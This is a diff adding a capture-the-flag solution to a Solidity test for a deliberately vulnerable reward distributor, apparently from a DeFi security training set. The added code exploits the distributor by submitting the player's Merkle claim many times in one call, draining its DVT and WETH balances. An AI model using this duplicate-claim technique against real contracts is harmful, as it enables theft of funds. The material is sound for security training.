@@ -148,7 +148,37 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        IERC20 dvt_token = IERC20(address(dvt));
+        _exploit(dvt_token, TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT, "/test/the-rewarder/dvt-distribution.json");
+        dvt_token.transfer(recovery, dvt_token.balanceOf(player));
+
+        IERC20 weth_token = IERC20(address(weth));
+        _exploit(weth_token, TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT, "/test/the-rewarder/weth-distribution.json");
+        weth_token.transfer(recovery, weth_token.balanceOf(player));
+    }
+
+    function _exploit(IERC20 token, uint256 remainingAmount, string memory path) internal {
+        Reward[] memory rewards = abi.decode(
+            vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[])
+        );
+
+        Claim memory claim;
+        for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
+            if (rewards[i].beneficiary != player) continue;
+            
+            claim.amount = rewards[i].amount;
+            claim.proof = merkle.getProof(_loadRewards(path), i);
+
+            break;
+        }
+
+        Claim[] memory claims = new Claim[](remainingAmount / claim.amount);
+        for (uint256 j = 0; j < claims.length; j++) { claims[j] = claim; }
+
+        IERC20[] memory tokens = new IERC20[](1);
+        tokens[0] = token;
+
+        distributor.claimRewards(claims, tokens);
     }
 
     /**
